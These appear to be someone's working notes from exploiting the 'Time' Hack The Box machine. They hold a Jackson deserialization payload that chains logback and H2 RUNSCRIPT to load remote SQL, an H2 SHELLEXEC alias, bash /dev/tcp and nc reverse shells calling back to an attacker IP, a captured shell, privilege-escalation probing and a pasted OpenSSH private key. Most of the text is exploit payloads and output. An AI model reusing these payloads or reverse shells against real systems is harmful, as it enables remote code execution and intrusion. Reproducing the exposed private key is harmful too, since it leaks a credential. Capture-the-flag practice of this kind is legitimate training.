



# time

```bash
nmap -sC -sV 10.129.32.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-31 00:21 UTC
Nmap scan report for ip-10-129-32-8.ec2.internal (10.129.32.8)
Host is up (0.083s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Online JSON parser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: No content to map due to end-of-input

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'ture': was expecting 'null', 'true', 'false' or NaN

Validation failed:
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'microtaskDebounce': was expecting ('true', 'false' or 'null')

Validation failed:
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'w': was expecting ('true', 'false' or 'null')

Validation failed:
Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'w': was expecting ('true', 'false' or 'null')

Validation failed:
Unhandled Java exception:
com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT),
expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object



Payload:Validation failed:
Unhandled Java exception:
com.fasterxml.jackson.databind.JsonMappingException: URL format error;
must be "jdbc:h2:{ {.|mem:}[name] | [file:]fileName | {tcp|ssl}:[//]server[:port][,server2[:port]]/name }[;key=value...]"
but is  "jdbc:h2:tcp://10.10.14.50:8989" [90046-199] (through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource["connection"])


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://10.10.14.50/"}]

Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException:
Connection is broken: "java.net.ConnectException: Connection refused (Connection refused): 10.10.14.50" [90067-199] (through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource["connection"])



Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.JsonMappingException:
No suitable driver found for jdbc:tcp://10.10.14.50/ (through reference chain: ch.qos.logback.core.db.DriverManagerConnectionSource["connection"])


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:tcp://10.10.14.50/"}]

$ nc -vv -l 10.129.32.8 -p 9000


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce\", {"url":"jdbc:h2:tcp://10.129.32.8/"}]"

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('u' (code 117)): was expecting comma to separate Array entries

Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unexpected character ('\' (code 92)): expected a valid value (number, String, array, object, 'true', 'false' or 'null')


Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.InvalidTypeIdException:
Could not resolve type id 'ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce' as a subtype of [simple type, class java.lang.Object]: no such class found


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce\", {"url":"jdbc:h2:tcp://10.129.32.8/"}]"
# Validation successful!


"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:9000/inject.sql'"}]"


# setup the web page

python -m SimpleHTTPServer 9000 # py2
python3 -m http.server 9000

http://0.0.0.0:9000/


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource $ nc -lv 9000 rce\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:9000/inject.sql'"}]"
# Validation successful!


"["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://localhost:9000/inject.sql'"}]"


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]
# running for long time
# Validation failed: 2020-10-31 01:59:30 command: slow query: 118 ms


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"}]
# Validation failed: 2020-10-31 01:56:26 lock: 3 shared read lock unlock SYS


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://0.0.0.0:9000/inject.sql'"}]
# Validation failed: 2020-10-31 01:53:53 lock: 3 shared read lock unlock SYS

"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://0.0.0.0:9000/inject.sql'"}]"
# Validation successful!

"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"}]"
# Validation successful!


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.129.32.8:9000/inject.sql'"}]
# Validation failed: 2020-10-31 02:09:42 lock: 3 shared read lock unlock SYS


"[\"ch.qos.logback.core.db.DriverManagerConnectionSource\", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]"

["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]
# CALL SHELLEXEC('nc 10.10.14.50 9000')
# Validation failed: 2020-10-31 02:28:18 command: slow query: 641 ms
# Validation failed: 2020-10-31 02:31:47 command: slow query: 632 ms
# Validation failed: 2020-10-31 02:33:06 command: slow query: 647 ms
# Validation failed: 2020-10-31 02:33:06 command: slow query: 647 ms


# htbox        >  my kali listen on 2424
# 10.129.32.8     10.10.14.50


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:9000/inject.sql'"}]
# CALL SHELLEXEC('nc 10.10.14.50 2424 –e /bin/bash')
# CALL SHELLEXEC('nc -e /bin/sh 10.10.14.50 2424')
# host:
# $ nc -vv -l 0.0.0.0 -p 2424
# 0.0.0.0: inverse host lookup failed: Unknown host
# listening on [any] 2424 ...
# invalid connection to [10.10.14.50] from ip-10-129-32-8.ec2.internal [10.129.32.8] 58842
# htb:
# Validation failed: 2020-10-31 02:43:35 lock: 3 exclusive write lock requesting for SYS


# be careful for the special character:
[“ch.qos.logback.core.db.DriverManagerConnectionSource”, {“url”:“jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://10.10.14.50:9000/inject.sql’“}]



# inject.sql:
bash -i >& /dev/tcp/10.10.14.50/2424 0>&1

# host:
nc -lvp 2424
listening on [any] 2424 ...
connect to [10.10.14.50] from ip-10-129-32-8.ec2.internal [10.129.32.8] 58866
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
pericles@time:/var/www/html$


hashcat -m 1400 -a 0 -o 10790631378d0d5e0d85e40ca7f23a17 /usr/share/wordlists/rockyou.txt

```


```
require 'java'
Dir["./classpath/*.jar"].each do |f|
    require f
end
java_import 'com.fasterxml.jackson.databind.ObjectMapper'
java_import 'com.fasterxml.jackson.databind.SerializationFeature'

content = ARGV[0]

puts "Mapping"
mapper = ObjectMapper.new
mapper.enableDefaultTyping()
mapper.configure(SerializationFeature::FAIL_ON_EMPTY_BEANS, false);
puts "Serializing"
obj = mapper.readValue(content, java.lang.Object.java_class) # invokes all the setters
puts "objectified"
puts "stringified: " + mapper.writeValueAsString(obj)
```


```sql
-- CREATE ALIAS SHELLEXEC
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
    String[] command = {"bash", "-c", cmd};
    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\A");
    return s.hasNext() ? s.next() : "";  }
$$;

-- CALL ALIAS SHELLEXEC with iput
-- CALL SHELLEXEC('id > exploited.txt')
CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.14.50/2424 0>&1')
```


inside the box

```bash
pericles@time: cd /home/pericles/snap/lxd/current/.config/lxc


pericles@time:/home/pericles/snap/lxd/current/.config/lxc$ cat config.yml
cat config.yml
default-remote: local
remotes:
  images:
    addr: https://images.linuxcontainers.org
    protocol: simplestreams
    public: true
  local:
    addr: unix://
    public: false
aliases: {}

ps fauxwww


pericles@time:/home/pericles/snap/lxd/current/.config/lxc$ lxc remote list
lxc remote list
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
|      NAME       |                   URL                    |   PROTOCOL    |  AUTH TYPE  | PUBLIC | STATIC |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| images          | https://images.linuxcontainers.org       | simplestreams | none        | YES    | NO     |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| local (default) | unix://                                  | lxd           | file access | NO     | YES    |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| ubuntu          | https://cloud-images.ubuntu.com/releases | simplestreams | none        | YES    | YES    |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+
| ubuntu-daily    | https://cloud-images.ubuntu.com/daily    | simplestreams | none        | YES    | YES    |
+-----------------+------------------------------------------+---------------+-------------+--------+--------+

# reverse version does not work
pericles@time:/home/pericles$ snap revert snap --revision=2.37.1
snap revert snap --revision=2.37.1
error: access denied (try with sudo)



pericles@time:/home/pericles/snap/lxd/current/.config/lxc$ ls -aslh /run/snapd*
</snap/lxd/current/.config/lxc$ ls -aslh /run/snapd*       
0 srw-rw-rw- 1 root root  0 Nov  7 00:37 /run/snapd-snap.socket
0 srw-rw-rw- 1 root root  0 Nov  7 00:37 /run/snapd.socket



/run/snapd:
total 0
0 drwxr-xr-x  4 root root  80 Nov  7 00:37 .
0 drwxr-xr-x 27 root root 860 Nov  7 01:34 ..
0 drwxr-xr-x  2 root root  80 Nov  7 00:37 lock
0 drwxr-xr-x  2 root root 100 Nov  7 00:37 ns




# it is possible to create a local user account using the daemon's "POST /v2/create-user" API. This API command, though, requires the program to have root permission, or a uid of 0, in order to create a user.

cd /tmp/hsperfdata_pericles


ls -la
total 72
drwxr-xr-x 2 pericles pericles  4096 Nov  7 01:02 .
drwxrwxrwt 3 root     root      4096 Nov  7 00:43 ..
-rw------- 1 pericles pericles 32768 Nov  7 02:27 2349
-rw------- 1 pericles pericles 32768 Nov  7 02:27 5865


pericles@time:/tmp/hsperfdata_pericles$ ssh-keygen -t rsa
ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/home/pericles/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Created directory '/home/pericles/.ssh'.
Your identification has been saved in /home/pericles/.ssh/id_rsa
Your public key has been saved in /home/pericles/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:HvishPfkLpkAqrbhKG2hKRAbjoGHAnnoPOs6Ffwq9EI pericles@time
The keys randomart image is:
+---[RSA 3072]----+
| o               |
|+ .              |
|=+               |
|B+=    .         |
|+Bo+  . S        |
|=Eo o. + .       |
|**.o..oo=        |
|@+=. o+=         |
|B*o   .o+        |
+----[SHA256]-----+



-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----





```

---

ref
- [Abusing H2 Database ALIAS](https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html)
- [java.vul](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html)
- [On Jackson CVEs: Don’t Panic — Here is what you need to know](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062#da96)
- [CVE](https://www.cvedetails.com/cve/CVE-2017-7525/)
- [$$](https://stackoverflow.com/questions/12144284/what-are-used-for-in-pl-pgsql)
- [Exploiting insecure deserialization vulnerabilities](https://portswigger.net/web-security/deserialization/exploiting)


["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.50:8989/inject.sql'"}]


[“ch.qos.logback.core.db.DriverManagerConnectionSource”, {“url”:“jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM ‘http://10.10.14.50:9000/inject.sql’“}]


.
